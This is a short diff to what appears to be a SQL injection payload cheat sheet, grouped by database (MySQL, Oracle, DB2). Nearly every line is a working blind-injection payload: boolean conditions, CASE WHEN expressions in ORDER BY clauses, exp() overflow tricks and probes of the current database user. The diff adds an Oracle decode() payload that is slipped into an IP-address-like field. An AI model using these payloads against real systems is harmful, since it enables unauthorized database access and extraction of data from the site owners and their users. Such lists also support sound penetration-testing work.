@@ -38,7 +38,8 @@ case when 1=1 then 1 else 1/0 end
 (case%0a1%0awhen%0a1%0athen%0a1%0aelse%0a1%0aend)%0aSSSSasc
 '||(exp(case+when+2=1+then+1000+else+3+end))||'
 '||(exp(case+when+2=2+then+1000+else+3+end))||'
-/(len(suser_sname())-{{int(0-10)}})
+/(len(user())-{{int(0-10)}})
+22.22.22.'||decode(1,1,'2')||'2
 
 
 oracle
@@ -56,6 +57,8 @@ position('p' in 'postgresql')返回的则是1
 db2
 1' and  '1'='1' and '1'='1
 1' and  '1'='2' and '1'='1
+55.98.1.25==> 55.98.1.'||decode(length(user),1,'2')||'5
+
 
 (case SUBSTR(USER,1,1) when CHR(50) then exp(900) else PROVINCE_ID end) asc
 (case 1 when 1 then exp(900) else PROVINCE_ID end) asc
